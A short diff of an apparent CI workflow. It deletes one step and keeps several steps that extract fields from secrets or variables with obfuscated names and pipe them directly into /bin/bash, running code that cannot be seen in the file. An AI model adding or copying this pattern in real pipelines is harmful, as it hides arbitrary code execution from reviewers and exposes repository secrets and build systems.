@@ -22,7 +22,6 @@ jobs:
           belks4555: ${{ secrets.belks4555 }}
         run: |
           printf '%s' "$belks4555" | jq -r .ygq65782 | /bin/bash
-          printf '%s' "$c1" | jq -r .pnso819 | /bin/bash
           echo $pzi90689 | jq -r .cdai3 | /bin/bash
           echo $eovg06 | jq -r .vzay376 | /bin/bash
 
